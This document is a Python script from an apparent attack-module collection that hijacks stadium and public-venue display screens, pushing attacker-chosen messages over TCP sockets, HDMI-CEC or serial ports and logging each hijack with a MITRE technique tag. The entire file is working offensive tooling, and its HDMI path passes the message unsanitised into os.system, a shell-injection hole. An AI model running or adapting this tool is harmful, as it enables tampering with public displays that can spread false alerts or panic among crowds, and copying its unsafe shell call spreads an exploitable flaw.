#!/usr/bin/env python3
# modules/attacks/stadium_screen_hijacker.py

import os
import time
import json
import socket
import argparse
from datetime import datetime

LOG_FILE = "results/stadium_screen_hijack_log.json"
MITRE_TTP = "T1565.002"

def log_event(method, target, message):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "target": target,
        "message": message,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def hijack_tcp(ip, port, message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendall(message.encode() + b'\n')
        s.close()
        log_event("TCP", f"{ip}:{port}", message)
        print(f"[✓] TCP message sent to screen at {ip}:{port}")
    except Exception as e:
        print(f"[!] TCP error: {e}")

def hijack_hdmi_cec(message):
    try:
        os.system(f"echo '{message}' | cec-client -s -d 1")
        log_event("HDMI-CEC", "local", message)
        print(f"[✓] HDMI-CEC command sent")
    except Exception as e:
        print(f"[!] HDMI-CEC error: {e}")

def hijack_serial(port, message):
    try:
        with open(port, "w") as f:
            f.write(message + "\n")
        log_event("Serial", port, message)
        print(f"[✓] Serial message sent to screen via {port}")
    except Exception as e:
        print(f"[!] Serial error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack stadium or public venue screens with custom messages")
    parser.add_argument("--method", choices=["tcp", "hdmi", "serial"], required=True)
    parser.add_argument("--target", help="IP or serial port")
    parser.add_argument("--port", type=int, help="TCP port (if TCP method)")
    parser.add_argument("--msg", required=True, help="Payload message to display")
    args = parser.parse_args()

    if args.method == "tcp":
        if not args.port or not args.target:
            print("[!] TCP requires --target and --port")
        else:
            hijack_tcp(args.target, args.port, args.msg)
    elif args.method == "hdmi":
        hijack_hdmi_cec(args.msg)
    elif args.method == "serial":
        hijack_serial(args.target, args.msg)
